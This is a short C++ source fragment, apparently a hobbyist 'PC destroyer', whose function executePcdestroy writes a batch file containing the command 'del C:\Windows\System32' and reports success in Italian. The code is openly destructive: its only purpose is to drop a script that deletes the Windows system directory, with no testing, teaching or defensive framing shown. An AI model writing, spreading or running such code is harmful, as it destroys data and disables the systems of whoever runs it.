#include <iostream>
#include <fstream>
#include <string>

using namespace std;

void executePcdestroy() {
    try {
        ofstream specificblock("specificblock.bat");
        specificblock << ("del C:\\Windows\\System32");
        cout << "\nFile creato con successo!\n";
        specificblock.close();
    } catch(...) {
        cout << "Errore durante la creazione del programma!";
    }
}